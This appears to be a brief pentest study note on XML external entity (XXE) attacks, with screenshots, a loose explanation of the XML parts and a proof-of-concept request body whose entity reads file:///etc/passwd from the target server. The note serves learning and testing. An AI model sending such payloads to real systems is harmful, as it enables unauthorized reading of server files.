# XML External Entities

## XXE POC



* **Make a simple request and get the response from BURP :**

![](../../../.gitbook/assets/9da225e09c474fe4bf8cba9b6f7eaf2a.png)

```text
XML = version 1.0
Doctype root element is “thp”
!ELEMENT speciafy any type
!ENTITY set the book to the string “Universe”
Finaly the XML output
```

* Original request :

![](../../../.gitbook/assets/1472eef1a76c4035b9089a4a27973acd.png)

```text
data=<?xml version="1.0" ?>
<!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The %26book%3b</thp>
```

![](../../../.gitbook/assets/72506e4d16bf4e8191661e72a8a02fb8.png)

